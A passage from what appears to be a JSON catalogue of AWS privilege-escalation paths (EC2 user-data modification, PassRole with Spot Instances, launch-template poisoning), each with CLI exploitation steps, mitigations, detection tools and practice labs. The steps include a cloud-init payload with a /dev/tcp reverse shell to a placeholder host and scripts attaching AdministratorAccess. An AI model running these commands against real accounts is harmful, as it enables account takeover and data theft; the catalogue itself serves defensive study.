        "Target EC2 instance must have a role with administrative permissions attached"
      ],
      "lateral": [
        "EC2 instance must have an instance profile attached to an IAM role"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# Create malicious user data with cloud-init configuration\nTEXT='Content-Type: multipart/mixed; boundary=\"//\"\nMIME-Version: 1.0\n\n--//\nContent-Type: text/cloud-config; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"cloud-config.txt\"\n\n#cloud-config\ncloud_final_modules:\n- [scripts-user, always]\n\n--//\nContent-Type: text/x-shellscript; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"userdata.txt\"\n\n#!/bin/bash\nbash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\n--//'\nTEXT_PATH=\"/tmp/text.b64.txt\"\nprintf \"%s\" \"$TEXT\" | base64 > \"$TEXT_PATH\"\n",
          "description": "Create base64-encoded malicious user data with reverse shell payload"
        },
        {
          "step": 2,
          "command": "aws ec2 stop-instances --instance-ids $INSTANCE_ID",
          "description": "Stop the target EC2 instance"
        },
        {
          "step": 3,
          "command": "aws ec2 modify-instance-attribute --instance-id \"$INSTANCE_ID\" --attribute userData --value \"file://$TEXT_PATH\"",
          "description": "Modify the user data with the malicious script"
        },
        {
          "step": 4,
          "command": "aws ec2 start-instances --instance-ids $INSTANCE_ID",
          "description": "Start the instance to trigger execution of the malicious user data"
        }
      ]
    },
    "recommendation": "The combination of `ec2:ModifyInstanceAttribute`, `ec2:StopInstances`, and `ec2:StartInstances`\nis highly sensitive. IAM policies should avoid granting these permissions together,\nespecially with wildcard resources. If necessary, use the Resource element in IAM policies\nto strictly limit these actions to a specific, intended set of instances. Monitor CloudTrail\nlogs for this sequence of API calls.\n",
    "discoveredBy": {
      "name": "Unknown",
      "organization": "Unknown"
    },
    "references": [
      {
        "title": "Bishop Fox Blog - Privilege Escalation in AWS",
        "url": "https://bishopfox.com/blog/privilege-escalation-in-aws"
      }
    ],
    "permissions": {
      "required": [
        {
          "permission": "ec2:ModifyInstanceAttribute",
          "resourceConstraints": "Target EC2 instance must be in the Resource section"
        },
        {
          "permission": "ec2:StopInstances",
          "resourceConstraints": "Target EC2 instance must be in the Resource section"
        },
        {
          "permission": "ec2:StartInstances",
          "resourceConstraints": "Target EC2 instance must be in the Resource section"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with ec2:ModifyInstanceAttribute, ec2:StopInstances, and ec2:StartInstances permissions. Can be an IAM user or role. This principal will modify an existing EC2 instance's user data to inject a malicious script.\n"
        },
        {
          "id": "target_instance",
          "label": "Existing EC2 Instance",
          "type": "resource",
          "description": "An existing EC2 instance that has an IAM role attached via an instance profile. The attacker will modify this instance's user data to inject a malicious script that executes on the next boot.\n"
        },
        {
          "id": "attached_role",
          "label": "Existing Role That Trusts the ec2 Service",
          "type": "resource",
          "description": "The IAM role already attached to the target EC2 instance. This role must have an instance profile and trust ec2.amazonaws.com. When the malicious user data script executes, it has access to this role's credentials via the instance metadata service (IMDS) at http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
        },
        {
          "id": "method_userdata",
          "label": "Method 1: User Data Script Takes Action",
          "type": "action",
          "color": "#99ccff",
          "description": "Configure the user data script to directly perform privileged AWS API actions when it executes. The script runs with access to the attached role's credentials via IMDS and can perform any action the role permits.\n\nThe malicious user data uses cloud-init's multipart MIME format with `cloud_final_modules: [scripts-user, always]` to force execution on subsequent boots. The script can:\n- Grant permissions to the starting principal (attach policies, create access keys)\n- Exfiltrate data from S3, RDS, DynamoDB, Secrets Manager\n- Modify security configurations\n- Any AWS API action the attached role has permissions for\n"
        },
        {
          "id": "method_reverse_shell",
          "label": "Method 2: Reverse Shell to Remote Listener",
          "type": "action",
          "color": "#99ccff",
          "description": "Configure the user data script to establish a reverse shell connection to an attacker-controlled server. This provides interactive remote access with the attached role's credentials.\n\nThe malicious user data uses cloud-init configuration to force the script to execute on subsequent boots. The reverse shell command (e.g., `bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1`) connects to the attacker's listener, providing a shell session where the attacker can:\n- Query IMDS for temporary credentials\n- Execute arbitrary AWS CLI commands\n- Perform reconnaissance and data exfiltration\n- All commands execute with the attached role's permissions\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The attached role has administrative permissions (AdministratorAccess or equivalent). Using either exploitation method, the attacker successfully leverages these permissions to gain full administrative access to the AWS account.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The attached role has some elevated permissions (but not full admin). Using either exploitation method, the attacker can leverage these permissions for data exfiltration (S3, RDS, DynamoDB), modification of security configurations, or additional privilege escalation paths.\n"
        },
        {
          "id": "no_access",
          "label": "Minimal Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The attached role only has minimal permissions (like logs:PutLogEvents). Regardless of the exploitation method used, the privilege escalation provides minimal value, though it could still be useful for reconnaissance.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_instance",
          "label": "ec2:StopInstances + ec2:ModifyInstanceAttribute + ec2:StartInstances",
          "description": "Stop the target EC2 instance, modify its user data with a malicious script, and start the instance to trigger execution.\n\nCommands:\n```bash\n# Stop the instance\naws ec2 stop-instances --instance-ids $INSTANCE_ID\n\n# Create malicious user data with cloud-init configuration\nTEXT='Content-Type: multipart/mixed; boundary=\"//\"\nMIME-Version: 1.0\n\n--//\nContent-Type: text/cloud-config; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"cloud-config.txt\"\n\n#cloud-config\ncloud_final_modules:\n- [scripts-user, always]\n\n--//\nContent-Type: text/x-shellscript; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\nContent-Disposition: attachment; filename=\"userdata.txt\"\n\n#!/bin/bash\n# Malicious payload here\n--//'\nprintf \"%s\" \"$TEXT\" | base64 > /tmp/text.b64.txt\n\n# Modify user data\naws ec2 modify-instance-attribute \\\n  --instance-id \"$INSTANCE_ID\" \\\n  --attribute userData \\\n  --value \"file:///tmp/text.b64.txt\"\n\n# Start the instance\naws ec2 start-instances --instance-ids $INSTANCE_ID\n```\n\nThe cloud-init configuration forces the user data script to execute on every boot (not just initial launch).\n"
        },
        {
          "from": "target_instance",
          "to": "attached_role",
          "label": "Instance assumes role",
          "description": "When the instance boots, it automatically assumes the attached IAM role. The malicious user data script executes with access to the role's temporary credentials via the instance metadata service (IMDS).\n"
        },
        {
          "from": "attached_role",
          "to": "method_userdata",
          "label": "Option A",
          "description": "Use the user data script to directly execute AWS CLI commands when the instance boots. The script has access to the attached role's credentials via IMDS and can perform privileged actions immediately.\n\nExample: The script could attach AdministratorAccess to the starting principal, create access keys for a privileged user, or exfiltrate sensitive data.\n"
        },
        {
          "from": "attached_role",
          "to": "method_reverse_shell",
          "label": "Option B",
          "description": "Use the user data script to establish a reverse shell connection to an attacker-controlled server. This provides interactive access with the attached role's credentials available via IMDS.\n\nExample: `bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1`\n"
        },
        {
          "from": "method_userdata",
          "to": "admin",
          "label": "If attached role has admin permissions",
          "branch": "A1",
          "condition": "admin",
          "description": "The user data script executes with AdministratorAccess permissions and successfully grants the starting principal full administrative access or performs other privileged actions.\n"
        },
        {
          "from": "method_userdata",
          "to": "some_perms",
          "label": "If attached role has some elevated permissions",
          "branch": "A2",
          "condition": "some_permissions",
          "description": "The user data script executes with elevated permissions and can perform privileged actions within those permissions, such as data exfiltration or security configuration changes.\n"
        },
        {
          "from": "method_userdata",
          "to": "no_access",
          "label": "If attached role has minimal permissions",
          "branch": "A3",
          "condition": "no_permissions",
          "description": "The user data script has minimal permissions and provides limited value for privilege escalation.\n"
        },
        {
          "from": "method_reverse_shell",
          "to": "admin",
          "label": "If attached role has admin permissions",
          "branch": "B1",
          "condition": "admin",
          "description": "The reverse shell successfully connects and provides access to credentials with AdministratorAccess permissions, granting full administrative access to the AWS account.\n"
        },
        {
          "from": "method_reverse_shell",
          "to": "some_perms",
          "label": "If attached role has some elevated permissions",
          "branch": "B2",
          "condition": "some_permissions",
          "description": "The reverse shell connects and provides access to credentials with elevated permissions that can be used for data access or further escalation.\n"
        },
        {
          "from": "method_reverse_shell",
          "to": "no_access",
          "label": "If attached role has minimal permissions",
          "branch": "B3",
          "condition": "no_permissions",
          "description": "The reverse shell connects but the credentials have minimal permissions and provide limited value for privilege escalation.\n"
        }
      ]
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/ec2-modifyinstanceattribute+stopinstances+startinstances",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "pwnedlabs": {
        "type": "closed-source",
        "description": "Hosted cloud security labs with AWS privilege escalation scenarios",
        "scenario": "https://pwnedlabs.io/labs/command-injection-to-ec2-user-data-privilege-escalation",
        "scenarioPricingModel": "paid"
      }
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/ec2/ec2-002.yaml"
  },
  {
    "id": "ec2-003",
    "name": "iam:PassRole + ec2:RequestSpotInstances",
    "category": "service-passrole",
    "services": [
      "iam",
      "ec2"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Must have access to a privileged role ARN that trusts ec2.amazonaws.com"
        },
        {
          "permission": "ec2:RequestSpotInstances",
          "resourceConstraints": "Must be able to request EC2 Spot Instances"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and permissions"
        },
        {
          "permission": "iam:ListInstanceProfiles",
          "resourceConstraints": "Helpful for finding instance profiles with privileged roles"
        },
        {
          "permission": "ec2:DescribeSpotInstanceRequests",
          "resourceConstraints": "Useful for verifying spot instance request status and getting instance details"
        },
        {
          "permission": "ec2:DescribeInstances",
          "resourceConstraints": "Helpful for verifying instance launch and monitoring status"
        }
      ]
    },
    "description": "A principal with `iam:PassRole` and `ec2:RequestSpotInstances` permissions can escalate privileges by requesting an EC2 Spot Instance with a privileged IAM instance profile. The Spot Instance launches with the privileged role's credentials, which can then be used to execute commands (via user-data scripts) that grant additional permissions to the starting principal. This technique is functionally identical to the standard `ec2:RunInstances` privilege escalation path, but uses Spot Instances instead. Security teams must understand that restricting `ec2:RunInstances` alone is insufficient - they must also restrict `ec2:RequestSpotInstances` to prevent the same attack vector. EC2 Spot Instances are spare compute capacity available at significantly discounted rates (up to 90% off On-Demand prices), making them particularly attractive for attackers executing privilege escalation while minimizing costs.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts ec2.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)",
        "The role must have an instance profile associated with it",
        "A VPC and subnet must be available for launching the Spot Instance"
      ],
      "lateral": [
        "A role must exist that trusts ec2.amazonaws.com to assume it",
        "The role must have an instance profile associated with it",
        "A VPC and subnet must be available for launching the Spot Instance"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# Get the AWS account ID\nACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)\n\n# Find a suitable AMI (Amazon Linux 2023)\nAMI_ID=$(aws ec2 describe-images \\\n    --owners amazon \\\n    --filters \"Name=name,Values=al2023-ami-2023.*-x86_64\" \"Name=state,Values=available\" \\\n    --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \\\n    --output text)\n\n# Get default VPC and subnet\nDEFAULT_VPC=$(aws ec2 describe-vpcs --filters \"Name=is-default,Values=true\" --query 'Vpcs[0].VpcId' --output text)\nDEFAULT_SUBNET=$(aws ec2 describe-subnets --filters \"Name=vpc-id,Values=$DEFAULT_VPC\" --query 'Subnets[0].SubnetId' --output text)\n",
          "description": "Gather necessary information including account ID, AMI, VPC, and subnet for launching the Spot Instance"
        },
        {
          "step": 2,
          "command": "# Create user-data script to attach AdministratorAccess to starting principal\nUSER_DATA=$(cat <<'EOF'\n#!/bin/bash\nexec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1\necho \"Starting privilege escalation script...\"\n\nSTARTING_USER_NAME=\"YOUR_USERNAME_HERE\"\n\n# Wait for IAM role to be available\nsleep 15\n\n# Attach AdministratorAccess policy to the starting user\naws iam attach-user-policy \\\n  --user-name $STARTING_USER_NAME \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\necho \"AdministratorAccess attached to $STARTING_USER_NAME successfully\"\nEOF\n)\n\n# Base64 encode the user-data\nUSER_DATA_B64=$(echo \"$USER_DATA\" | base64 | tr -d '\\n')\n",
          "description": "Prepare a user-data script that will attach AdministratorAccess policy to your starting principal. Replace YOUR_USERNAME_HERE with your actual username."
        },
        {
          "step": 3,
          "command": "# Create launch specification for the Spot Instance\nLAUNCH_SPEC=$(cat <<EOF\n{\n  \"ImageId\": \"$AMI_ID\",\n  \"InstanceType\": \"t3.micro\",\n  \"IamInstanceProfile\": {\n    \"Name\": \"PRIVILEGED_INSTANCE_PROFILE_NAME\"\n  },\n  \"UserData\": \"$USER_DATA_B64\",\n  \"NetworkInterfaces\": [\n    {\n      \"DeviceIndex\": 0,\n      \"SubnetId\": \"$DEFAULT_SUBNET\",\n      \"AssociatePublicIpAddress\": true\n    }\n  ]\n}\nEOF\n)\n",
          "description": "Create the launch specification JSON for the Spot Instance request. Replace PRIVILEGED_INSTANCE_PROFILE_NAME with the name of the privileged instance profile you want to pass."
        },
        {
          "step": 4,
          "command": "# Request the Spot Instance with the privileged instance profile\naws ec2 request-spot-instances \\\n    --spot-price \"0.05\" \\\n    --instance-count 1 \\\n    --type \"one-time\" \\\n    --launch-specification \"$LAUNCH_SPEC\"\n",
          "description": "Request an EC2 Spot Instance with the privileged instance profile. This uses `iam:PassRole` to assign the privileged role to the Spot Instance."
        },
        {
          "step": 5,
          "command": "# Monitor the Spot Instance request status\naws ec2 describe-spot-instance-requests \\\n    --spot-instance-request-ids SPOT_REQUEST_ID \\\n    --query 'SpotInstanceRequests[0].[State,Status.Code,InstanceId]' \\\n    --output table\n",
          "description": "Monitor the Spot Instance request until it is fulfilled. Replace SPOT_REQUEST_ID with the ID from the previous command. Wait until the State is 'active' and Status is 'fulfilled'."
        },
        {
          "step": 6,
          "command": "# Wait 2-3 minutes for the instance to launch and execute the user-data script\n# Then verify that AdministratorAccess has been attached\naws iam list-attached-user-policies --user-name YOUR_USERNAME_HERE\n",
          "description": "Wait for the user-data script to execute (typically 2-3 minutes) and verify that the AdministratorAccess policy has been attached to your starting principal."
        },
        {
          "step": 7,
          "command": "# Verify administrator access by listing IAM users\naws iam list-users\n",
          "description": "Verify that you now have administrator access by listing IAM users or performing other admin-level actions."
        }
      ]
    },
    "limitations": "This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or provide access to sensitive data.\n\nThe attack requires a VPC and subnet to be available for launching the Spot Instance. The user-data script typically takes 2-3 minutes to execute after the instance launches.\n\nThis technique is functionally identical to the standard `ec2:RunInstances` privilege escalation - the only difference is the use of Spot Instances instead of On-Demand instances. Both must be restricted to prevent this attack vector.\n",
    "recommendation": "Restrict `iam:PassRole` using the principle of least privilege. Use IAM policy conditions to limit which roles can be passed and to which services:\n\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:role/SpecificRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"ec2.amazonaws.com\"\n    }\n  }\n}\n\nApply the same security controls to `ec2:RequestSpotInstances` as you would to `ec2:RunInstances`. Both provide equivalent privilege escalation paths and must be restricted together.\n\nImplement Service Control Policies (SCPs) preventing EC2 Spot Instances from being launched with administrative IAM roles.\n\nMonitor CloudTrail for `PassRole` API calls combined with `RequestSpotInstances` events targeting privileged roles. Alert on `AttachUserPolicy` and `PutUserPolicy` API calls, especially when invoked from EC2 instances.\n\nRegularly audit EC2 instances (including Spot Instances) for excessive IAM permissions using IAM Access Analyzer.\n\nUse resource tagging and condition keys to enforce separation of duties between role creation and role assignment.\n\nImplement IAM permission boundaries on users to limit the maximum permissions that can be attached.\n",
    "discoveredBy": {
      "name": "Carlos Polop",
      "organization": "HackTricks"
    },
    "references": [
      {
        "title": "AWS EC2 Privilege Escalation - HackTricks",
        "url": "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ec2-privesc/index.html"
      },
      {
        "title": "AWS Privilege Escalation Methods - Rhino Security Labs",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "relatedPaths": [
      "ec2-001",
      "ec2-002"
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/iam_edges.py#L221",
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/scan/policy_document.py#L523",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L189"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+ec2-requestspotinstances",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "iam_privesc_by_attachment",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice EC2 instance profile privilege escalation with PassRole (uses ec2:RunInstances but teaches the same PassRole concept)"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with `iam:PassRole` and `ec2:RequestSpotInstances` permissions. Can be an IAM user or role with access to pass a privileged IAM role to an EC2 Spot Instance."
        },
        {
          "id": "spot_instance",
          "label": "New EC2 Spot Instance",
          "type": "resource",
          "description": "The EC2 Spot Instance created via `ec2:RequestSpotInstances`. This instance is launched with a privileged IAM instance profile passed via `iam:PassRole`. Spot Instances are spare EC2 capacity available at up to 90% discount, making them cost-effective for attackers."
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the ec2 Service",
          "type": "resource",
          "description": "The privileged IAM role that the EC2 Spot Instance assumes through its instance profile. The role must trust `ec2.amazonaws.com` to assume it. The permissions of this role determine the attack's effectiveness."
        },
        {
          "id": "userdata_action",
          "label": "User-data script executes",
          "type": "action",
          "color": "#99ccff",
          "description": "The user-data script runs automatically when the Spot Instance boots, executing with the target-role's credentials. The script attempts to attach the AdministratorAccess policy to the starting principal.\n\nExample user-data script:\n```bash\n#!/bin/bash\naws iam attach-user-policy \\\n  --user-name starting-principal-name \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\nThe script's success depends on whether the target-role has IAM write permissions.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target-role has IAM write permissions (specifically `iam:AttachUserPolicy` or AdministratorAccess), the user-data script successfully attaches the AdministratorAccess policy to the starting principal. The starting principal now has full administrative access to the AWS account."
        },
        {
          "id": "some_perms",
          "label": "Limited Escalation Possible",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target-role has some elevated permissions but lacks IAM write permissions, the user-data script fails to attach AdministratorAccess. However, the starting principal may still benefit from:\n- Using the Spot Instance as a pivot point to access resources the role can reach\n- Exfiltrating data the role has access to\n- Exploring additional privilege escalation paths available to the role\n"
        },
        {
          "id": "no_access",
          "label": "No Effective Escalation",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target-role has minimal or read-only permissions, the user-data script fails to attach any policies, and there are no useful resources to access. No effective privilege escalation occurs, though the Spot Instance will still incur minimal costs."
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "spot_instance",
          "label": "iam:PassRole + ec2:RequestSpotInstances",
          "description": "The starting principal uses `ec2:RequestSpotInstances` to request an EC2 Spot Instance and `iam:PassRole` to pass a privileged IAM role via an instance profile.\n\nCommand:\n```bash\naws ec2 request-spot-instances \\\n  --spot-price \"0.05\" \\\n  --instance-count 1 \\\n  --type \"one-time\" \\\n  --launch-specification '{\n    \"ImageId\": \"ami-xxxxx\",\n    \"InstanceType\": \"t3.micro\",\n    \"IamInstanceProfile\": {\"Name\": \"privileged-instance-profile\"},\n    \"UserData\": \"base64-encoded-script\"\n  }'\n```\n\nThis creates a Spot Instance request with the privileged role attached.\n"
        },
        {
          "from": "spot_instance",
          "to": "target_role",
          "label": "Instance assumes role",
          "description": "When the Spot Instance launches, it automatically assumes the target-role through the IAM instance profile. The instance's metadata service provides temporary credentials for the role, which are available to any process running on the instance, including the user-data script."
        },
        {
          "from": "target_role",
          "to": "userdata_action",
          "label": "User-data script executes on boot",
          "description": "The user-data script executes automatically during instance initialization, running with the target-role's credentials. The script has full access to all permissions granted to the target-role, allowing it to make AWS API calls to attach policies to the starting principal."
        },
        {
          "from": "userdata_action",
          "to": "admin",
          "label": "If role has IAM write permissions",
          "branch": "A1",
          "condition": "admin",
          "description": "If the target-role has `iam:AttachUserPolicy` or equivalent IAM write permissions (such as AdministratorAccess), the user-data script successfully attaches the AdministratorAccess policy to the starting principal, granting full administrative access."
        },
        {
          "from": "userdata_action",
          "to": "some_perms",
          "label": "If role has some permissions but not IAM write",
          "branch": "A2",
          "condition": "some_permissions",
          "description": "If the target-role has elevated permissions to access resources (like S3, DynamoDB, Secrets Manager) but lacks IAM write permissions, the user-data script fails to attach AdministratorAccess. However, the starting principal may still pivot through the Spot Instance to access sensitive data or find additional escalation paths."
        },
        {
          "from": "userdata_action",
          "to": "no_access",
          "label": "If role has minimal permissions",
          "branch": "A3",
          "condition": "no_permissions",
          "description": "If the target-role only has minimal or read-only permissions, the user-data script fails and there are no useful resources to access. No effective privilege escalation occurs."
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/ec2/ec2-003.yaml"
  },
  {
    "id": "ec2-004",
    "name": "ec2:CreateLaunchTemplateVersion + ec2:ModifyLaunchTemplate",
    "category": "access-resource",
    "services": [
      "ec2",
      "iam"
    ],
    "permissions": {
      "required": [
        {
          "permission": "ec2:CreateLaunchTemplateVersion",
          "resourceConstraints": "Must be able to create new versions of existing launch templates"
        },
        {
          "permission": "ec2:ModifyLaunchTemplate",
          "resourceConstraints": "Must be able to modify launch template default version"
        }
      ],
      "additional": [
        {
          "permission": "ec2:DescribeLaunchTemplates",
          "resourceConstraints": "Helpful for discovering existing launch templates to target"
        },
        {
          "permission": "ec2:DescribeLaunchTemplateVersions",
          "resourceConstraints": "Useful for viewing existing template configuration including instance profiles"
        },
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering privileged roles already configured in templates"
        },
        {
          "permission": "iam:ListInstanceProfiles",
          "resourceConstraints": "Useful for identifying instance profiles with privileged roles"
        },
        {
          "permission": "autoscaling:DescribeAutoScalingGroups",
          "resourceConstraints": "Helpful for identifying which ASGs use the target launch template"
        },
        {
          "permission": "ec2:DescribeInstances",
          "resourceConstraints": "Useful for monitoring instance launches and verifying user data execution"
        },
        {
          "permission": "autoscaling:SetDesiredCapacity",
          "resourceConstraints": "Helpful for triggering instance launches via Auto Scaling Groups"
        }
      ]
    },
    "description": "A principal with `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions can escalate privileges by modifying an existing launch template that already references a privileged IAM role. The attacker creates a new template version that keeps the existing privileged role reference but injects malicious user data, then sets this version as the default. Crucially, this attack does NOT require `iam:PassRole` permissions because the attacker is simply referencing a role that already exists in a previous template version. When the next EC2 instance launches from the template (via Auto Scaling Groups, scheduled tasks, or manual launches), it automatically receives the privileged role and executes the malicious user data script, which can grant the attacker persistent administrative access. This is particularly dangerous in environments with auto-scaling policies or scheduled instance launches, where the malicious configuration may activate without any further attacker interaction. EC2 launch templates are commonly used with Auto Scaling Groups to define instance configuration including AMI, instance type, security groups, IAM instance profile, and user data scripts.",
    "prerequisites": {
      "admin": [
        "A launch template must exist that references an IAM role with administrative permissions in a previous version",
        "The template must be used by Auto Scaling Groups, scheduled tasks, or manual instance launches",
        "The attacker must be able to trigger or wait for an instance launch from the modified template"
      ],
      "lateral": [
        "A launch template must exist that references an IAM role with some elevated permissions",
        "The template must be used by Auto Scaling Groups, scheduled tasks, or manual instance launches"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# Discover existing launch templates\naws ec2 describe-launch-templates \\\n  --query 'LaunchTemplates[*].[LaunchTemplateName,LaunchTemplateId,DefaultVersionNumber]' \\\n  --output table\n",
          "description": "Enumerate existing launch templates to identify targets for modification."
        },
        {
          "step": 2,
          "command": "# Get template details including instance profile\naws ec2 describe-launch-template-versions \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --versions '$Default' \\\n  --query 'LaunchTemplateVersions[0].LaunchTemplateData'\n",
          "description": "Inspect the target launch template to identify templates that already have privileged IAM instance profiles configured. Look for templates with admin or elevated instance profiles. Replace lt-xxxxxxxxxxxxx with actual template ID."
        },
        {
          "step": 3,
          "command": "# Prepare malicious user data script\ncat > user-data.sh <<'EOF'\n#!/bin/bash\nexec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1\necho \"Starting privilege escalation script...\"\n\nSTARTING_USER_NAME=\"YOUR_USERNAME_HERE\"\n\n# Wait for IAM role to be available\nsleep 15\n\n# Attach AdministratorAccess policy to the starting user\naws iam attach-user-policy \\\n  --user-name $STARTING_USER_NAME \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\necho \"AdministratorAccess attached to $STARTING_USER_NAME successfully\"\nEOF\n\n# Base64 encode the user data\nUSER_DATA_B64=$(cat user-data.sh | base64 | tr -d '\\n')\n",
          "description": "Prepare a malicious user data script that will attach AdministratorAccess policy to your starting principal. Replace YOUR_USERNAME_HERE with your actual username."
        },
        {
          "step": 4,
          "command": "# Create a new launch template version with malicious user data\n# Keep the same instance profile from the existing version (no PassRole needed)\naws ec2 create-launch-template-version \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --source-version 1 \\\n  --launch-template-data \"{\n    \\\"IamInstanceProfile\\\": {\n      \\\"Name\\\": \\\"EXISTING_PRIVILEGED_INSTANCE_PROFILE\\\"\n    },\n    \\\"UserData\\\": \\\"$USER_DATA_B64\\\"\n  }\"\n",
          "description": "Create a new launch template version that references the existing privileged instance profile and includes the malicious user data. Replace lt-xxxxxxxxxxxxx with the target template ID and EXISTING_PRIVILEGED_INSTANCE_PROFILE with the instance profile name found in step 2. Note that this does NOT require iam:PassRole since you're referencing an existing role configuration."
        },
        {
          "step": 5,
          "command": "# Set the new version as the default\naws ec2 modify-launch-template \\\n  --launch-template-id lt-xxxxxxxxxxxxx \\\n  --default-version NEW_VERSION_NUMBER\n",
          "description": "Modify the launch template to set the malicious version as the default. Replace NEW_VERSION_NUMBER with the version number from step 4. All future instance launches will now use this malicious configuration."
        },
        {
          "step": 6,
          "command": "# Trigger instance launch (if template is used by an ASG)\naws autoscaling set-desired-capacity \\\n  --auto-scaling-group-name TARGET_ASG_NAME \\\n  --desired-capacity 1\n",
          "description": "Trigger an instance launch. If the template is used by an Auto Scaling Group, you can increase the desired capacity. Alternatively, wait for auto-scaling events or scheduled instance launches to trigger automatically."
        },
        {
          "step": 7,
          "command": "# Wait 2-3 minutes, then verify AdministratorAccess was attached\naws iam list-attached-user-policies --user-name YOUR_USERNAME_HERE\n",
          "description": "Wait for the instance to launch and execute the user data script (typically 2-3 minutes), then verify that AdministratorAccess has been attached to your starting principal."
        },
        {
          "step": 8,
          "command": "# Verify administrator access\naws iam list-users\n",
          "description": "Verify that you now have administrator access by listing IAM users or performing other admin-level actions."
        }
      ]
    },
    "limitations": "This path provides administrative access only if the target launch template already references a privileged IAM role with administrative permissions (or at least IAM write permissions like `iam:AttachUserPolicy`). If the existing template only references roles with limited permissions, the user data script may fail to attach policies.\n\nThe attack requires that instances actually launch from the modified template. This could happen through:\n- Auto Scaling Groups that automatically launch instances\n- Scheduled instance launches\n- Manual instance launches by other users\n- Auto-scaling events triggered by CloudWatch alarms\n\nThe attacker may need to wait for these events to occur naturally, or they need additional permissions to trigger instance launches (like `autoscaling:SetDesiredCapacity`).\n\nImportantly, this attack does NOT require `iam:PassRole` permissions because the attacker is simply referencing an IAM role that already exists in a previous template version. This makes it harder to detect than traditional PassRole-based attacks.\n",
